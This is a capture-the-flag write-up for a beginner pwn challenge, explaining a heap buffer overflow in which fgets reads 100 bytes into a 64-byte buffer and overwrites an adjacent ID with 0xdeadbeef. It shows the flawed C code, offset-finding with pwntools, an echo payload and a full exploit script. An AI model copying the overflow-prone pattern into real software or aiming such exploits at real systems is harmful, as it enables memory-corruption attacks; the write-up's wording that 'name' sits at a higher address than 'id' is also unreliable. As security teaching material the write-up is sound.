# memowy-cowwuption

## Challenge

The challenge asks for our name, then compares our ID to the admin ID.

If our ID is equal to the admin ID, it prints the flag.

```
Hello, what is your name?
Green-Avocado
Sorry Green-Avocado, your ID (0) does not match the admin ID (deadbeef)
```

## Solution

Our ID will always be 0 in normal execution, as there is no code to set the ID.

There is a buffer overflow in `vuln`, as `name` is 64 bytes long, but `fgets` reads 0x64 (100) bytes.

```c
char* name = malloc(64);
int* id = malloc(sizeof(int));

puts("Hello, what is your name?");

fgets(name, 0x64, stdin);
```

Note that `name` is allocated before `id`.
This means that `name` will be at a higher address than `id`.
A buffer overflow in the `name` chunk will overwrite the `id` chunk.

Let's test this by sending 99 A's:

```
Hello, what is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Sorry AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, your ID (41414141) does not match the admin ID (deadbeef)
```

Notice that our ID is no longer 0.
0x41 is the character code for 'A', which means we successfully overwrote the ID variable with "AAAA".

We can find the offset to the `id` variable on the heap by sending a string with a predictable pattern.
For example, a cyclic string using [pwntools](https://github.com/Gallopsled/pwntools):

```py
>>> from pwn import *
>>> cyclic(99)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa'
```

Now let's send this to the challenge:

```
Hello, what is your name?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa
Sorry aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa, your ID (61616175) does not match the admin ID (deadbeef)
```

Remember the binary is little endian.
An integer of 0x61616175 is stored as:

```
id     : 0x75
id + 1 : 0x61
id + 2 : 0x61
id + 3 : 0x61
```

This corresponds to the string "uaaa".
We can use this to find the offset in pwntools:

```py
>>> from pwn import *
>>> cyclic_find("uaaa")
80
```

So the `id` variable is 80 characters offset from `name`.

To send 0xdeadbeef, we need to pack the integer as a byte string: `b'\xef\xbe\xad\xde'`.
We also need to prepend 80 characters before it.

This can be done using `echo` and piped into the challenge:

```sh
$ echo -n -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde' | ./memowy-cowwuption
Hello, what is your name?
maple{ovewwwiting_stack_vawiabwes}
```

A better way to do this is using pwntools.
We can pack an 32-bit integer using `p32`:

```py
>>> from pwn import *
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
```

We can create a payload with 0xdeadbeef at the correct offset using `flat`:

```py
>>> from pwn import *
>>> flat({ 80: p32(0xdeadbeef) })
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa\xef\xbe\xad\xde'
```

And we can send this to a process or socket started using `process` or `connect`, respectively.

```py
>>> from pwn import *
>>> payload = flat({ 80: p32(0xdeadbeef) })
>>> io = process("./memowy-cowwuption")
[x] Starting local process './memowy-cowwuption'
[+] Starting local process './memowy-cowwuption': pid 1921327
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
[*] Process './memowy-cowwuption' stopped with exit code 0 (pid 1921327)
Hello, what is your name?
maple{ovewwwiting_stack_vawiabwes}

[*] Got EOF while reading in interactive
```

One last thing: it isn't strictly necessary to find the correct offset.
Since there isn't other important data on the heap, we are free to overwrite everything with 0xdeadbeef.
Thus we can just send `p32(0xdeadbeef) * 24` to achieve the overwrite and get the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1441 memowy-cowwuption
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('memowy-cowwuption')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1441)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendlineafter(b"Hello, what is your name?\n", p32(0xdeadbeef) * 24)

io.interactive()
```

## Flag

```
maple{ovewwwiting_stack_vawiabwes}
```
